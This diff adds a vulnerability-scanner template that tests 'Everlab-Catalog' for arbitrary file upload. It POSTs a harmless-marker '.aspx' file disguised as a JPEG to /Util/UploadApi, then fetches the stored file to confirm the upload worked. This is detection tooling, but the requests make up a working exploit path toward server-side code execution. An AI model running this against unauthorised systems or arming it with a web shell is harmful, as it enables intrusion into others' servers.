@@ -1,0 +1,66 @@
+id: poc-yaml-everlab-catalog-uploadapi-anyfile-upload
+info:
+  name: Everlab-Catalog UploadApi File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /Util/UploadApi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=---------------------------111
+
+        -----------------------------111
+        Content-Disposition: form-data; name="Filedata"; filename="{{t1}}.aspx"
+        Content-Type: image/jpeg
+
+        {{t2}}
+        -----------------------------111--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{{t1}}'
+      - type: word
+        part: header
+        words:
+          - "json"
+    extractors:
+      - type: regex
+        name: file
+        group: 1
+        regex:
+          - '"Results":"/(?P<file>.*?)"'
+        internal: true
+
+  - raw:
+      - |
+        GET /{{file}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{{t2}}'
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<"
